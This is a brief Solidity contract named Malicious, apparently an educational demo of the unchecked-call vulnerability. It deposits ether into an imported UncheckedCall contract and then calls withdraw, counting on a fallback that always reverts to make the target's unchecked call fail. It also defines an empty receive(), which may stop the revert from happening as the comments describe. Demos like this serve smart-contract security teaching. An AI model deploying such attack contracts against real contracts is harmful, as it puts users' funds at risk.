// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./UncheckedCall.sol";

contract Malicious {
    UncheckedCall public uncheckedCall;

    constructor(address _uncheckedCall) {
        uncheckedCall = UncheckedCall(_uncheckedCall);
    }

    // Fallback function always reverts
    fallback() external payable {
        revert("Call failed intentionally");
    }

    function attack() public {
        // Deposit some Ether to the vulnerable contract
        uncheckedCall.deposit{value: 1 ether}();

        // Attempt to withdraw, causing the `call` to fail
        uncheckedCall.withdraw(1 ether);
    }

    receive() external payable {}
}
